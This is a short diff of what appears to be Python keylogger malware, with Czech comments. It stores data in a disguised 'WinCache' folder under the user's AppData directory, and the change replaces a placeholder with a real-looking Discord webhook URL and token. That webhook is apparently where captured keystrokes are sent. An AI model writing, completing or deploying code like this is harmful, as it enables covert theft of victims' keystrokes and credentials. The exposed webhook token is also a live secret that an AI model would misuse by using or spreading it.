@@ -10,7 +10,7 @@ from zipfile import ZipFile
 folder_path = os.path.expanduser("~\\AppData\\Roaming\\WinCache")
 os.makedirs(folder_path, exist_ok=True)
 
-webhook_url = "TVŮJ_DISCORD_Whttps://discord.com/api/webhooks/1361740121510117666/_DyL1FKVxwO0SPz59EvVVs4cVeHZ9pEkCa8Hq5K1CHzqa2v2LkEBlFgtS3Yb3rj7KqkxEBHOOK_URL"  # <-- sem dej svůj webhook
+webhook_url = "https://discord.com/api/webhooks/1361740121510117666/_DyL1FKVxwO0SPz59EvVVs4cVeHZ9pEkCa8Hq5K1CHzqa2v2LkEBlFgtS3Yb3rj7Kqkx"  # <-- sem dej svůj webhook
 
 # ---------- Keylogger ----------
 def log_keys():
